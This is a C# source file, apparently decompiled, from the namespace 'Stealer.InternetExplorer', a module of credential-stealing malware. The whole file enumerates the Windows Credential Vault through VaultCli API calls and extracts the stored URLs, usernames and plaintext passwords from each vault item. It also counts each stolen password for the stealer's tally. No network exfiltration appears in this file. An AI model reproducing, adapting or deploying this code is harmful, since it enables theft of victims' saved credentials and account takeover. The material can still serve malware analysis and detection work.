using System;
using System.Collections.Generic;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace Stealer.InternetExplorer;

internal sealed class cPasswords
{
	public static List<Password> Get()
	{
		List<Password> list = new List<Password>();
		Version version = Environment.OSVersion.Version;
		int major = version.Major;
		int minor = version.Minor;
		Type type = ((major < 6 || minor < 2) ? typeof(VaultCli.VAULT_ITEM_WIN7) : typeof(VaultCli.VAULT_ITEM_WIN8));
		int vaultCount = 0;
		IntPtr vaultGuid = IntPtr.Zero;
		int num = VaultCli.VaultEnumerateVaults(0, ref vaultCount, ref vaultGuid);
		if (num != 0)
		{
			throw new Exception("[ERROR] Unable to enumerate vaults. Error (0x" + num + ")");
		}
		IntPtr ptr = vaultGuid;
		Dictionary<Guid, string> dictionary = new Dictionary<Guid, string>();
		dictionary.Add(new Guid("2F1A6504-0641-44CF-8BB5-3612D865F2E5"), "Windows Secure Note");
		dictionary.Add(new Guid("3CCD5499-87A8-4B10-A215-608888DD3B55"), "Windows Web Password Credential");
		dictionary.Add(new Guid("154E23D0-C644-4E6F-8CE6-5069272F999F"), "Windows Credential Picker Protector");
		dictionary.Add(new Guid("4BF4C442-9B8A-41A0-B380-DD4A704DDB28"), "Web Credentials");
		dictionary.Add(new Guid("77BC582B-F0A6-4E15-4E80-61736B6F3B29"), "Windows Credentials");
		dictionary.Add(new Guid("E69D7838-91B5-4FC9-89D5-230D4D4CC2BC"), "Windows Domain Certificate Credential");
		dictionary.Add(new Guid("3E0E35BE-1B77-43E7-B873-AED901B6275B"), "Windows Domain Password Credential");
		dictionary.Add(new Guid("3C886FF3-2669-4AA2-A8FB-3F6759A77548"), "Windows Extended Credential");
		dictionary.Add(new Guid("00000000-0000-0000-0000-000000000000"), null);
		for (int i = 0; i < vaultCount; i++)
		{
			object obj = Marshal.PtrToStructure(ptr, typeof(Guid));
			Guid vaultGuid2 = new Guid(obj.ToString());
			ptr = (IntPtr)(ptr.ToInt64() + Marshal.SizeOf(typeof(Guid)));
			IntPtr vaultHandle = IntPtr.Zero;
			string text = ((!dictionary.ContainsKey(vaultGuid2)) ? vaultGuid2.ToString() : dictionary[vaultGuid2]);
			num = VaultCli.VaultOpenVault(ref vaultGuid2, 0u, ref vaultHandle);
			if (num != 0)
			{
				Console.WriteLine("Unable to open the following vault: " + text + ". Error: 0x" + num);
				continue;
			}
			int vaultItemCount = 0;
			IntPtr vaultItem = IntPtr.Zero;
			num = VaultCli.VaultEnumerateItems(vaultHandle, 512, ref vaultItemCount, ref vaultItem);
			if (num != 0)
			{
				Console.WriteLine("[ERROR] Unable to enumerate vault items from the following vault: " + text + ". Error 0x" + num);
				continue;
			}
			IntPtr ptr2 = vaultItem;
			if (vaultItemCount <= 0)
			{
				continue;
			}
			for (int j = 1; j <= vaultItemCount; j++)
			{
				object obj2 = Marshal.PtrToStructure(ptr2, type);
				ptr2 = (IntPtr)(ptr2.ToInt64() + Marshal.SizeOf(type));
				IntPtr passwordVaultPtr = IntPtr.Zero;
				FieldInfo field = obj2.GetType().GetField("SchemaId");
				Guid schemaId = new Guid(field.GetValue(obj2)!.ToString());
				FieldInfo field2 = obj2.GetType().GetField("pResourceElement");
				IntPtr intPtr = (IntPtr)field2.GetValue(obj2);
				FieldInfo field3 = obj2.GetType().GetField("pIdentityElement");
				IntPtr intPtr2 = (IntPtr)field3.GetValue(obj2);
				IntPtr zero = IntPtr.Zero;
				if (major >= 6 && minor >= 2)
				{
					FieldInfo field4 = obj2.GetType().GetField("pPackageSid");
					zero = (IntPtr)field4.GetValue(obj2);
					num = VaultCli.VaultGetItem(vaultHandle, ref schemaId, intPtr, intPtr2, zero, IntPtr.Zero, 0, ref passwordVaultPtr);
				}
				else
				{
					num = VaultCli.VaultGetItem_1(vaultHandle, ref schemaId, intPtr, intPtr2, IntPtr.Zero, 0, ref passwordVaultPtr);
				}
				if (num != 0)
				{
					Console.WriteLine("Error occured while retrieving vault item. Error: 0x" + num);
					continue;
				}
				object obj3 = Marshal.PtrToStructure(passwordVaultPtr, type);
				FieldInfo field5 = obj3.GetType().GetField("pAuthenticatorElement");
				IntPtr vaultElementPtr = (IntPtr)field5.GetValue(obj3);
				Password item = default(Password);
				object obj4 = smethod_0(intPtr);
				if (obj4 != null)
				{
					item.sUrl = obj4.ToString();
				}
				object obj5 = smethod_0(intPtr2);
				if (obj5 != null)
				{
					item.sUsername = obj5.ToString();
				}
				object obj6 = smethod_0(vaultElementPtr);
				if (obj6 != null)
				{
					item.sPassword = obj6.ToString();
				}
				Counter.Passwords++;
				list.Add(item);
			}
		}
		return list;
	}

	[CompilerGenerated]
	internal static object smethod_0(IntPtr vaultElementPtr)
	{
		object obj = Marshal.PtrToStructure(vaultElementPtr, typeof(VaultCli.VAULT_ITEM_ELEMENT));
		FieldInfo field = obj.GetType().GetField("Type");
		object value = field.GetValue(obj);
		IntPtr ptr = (IntPtr)(vaultElementPtr.ToInt64() + 16L);
		switch ((int)value)
		{
		case 0:
		{
			object obj2 = Marshal.ReadByte(ptr);
			return (bool)obj2;
		}
		case 1:
			return Marshal.ReadInt16(ptr);
		case 2:
			return Marshal.ReadInt16(ptr);
		case 3:
			return Marshal.ReadInt32(ptr);
		case 4:
			return Marshal.ReadInt32(ptr);
		case 5:
			return Marshal.PtrToStructure(ptr, typeof(double));
		case 6:
			return Marshal.PtrToStructure(ptr, typeof(Guid));
		case 7:
		{
			IntPtr ptr2 = Marshal.ReadIntPtr(ptr);
			return Marshal.PtrToStringUni(ptr2);
		}
		default:
			return null;
		case 12:
		{
			IntPtr binaryForm = Marshal.ReadIntPtr(ptr);
			SecurityIdentifier securityIdentifier = new SecurityIdentifier(binaryForm);
			return securityIdentifier.Value;
		}
		}
	}
}
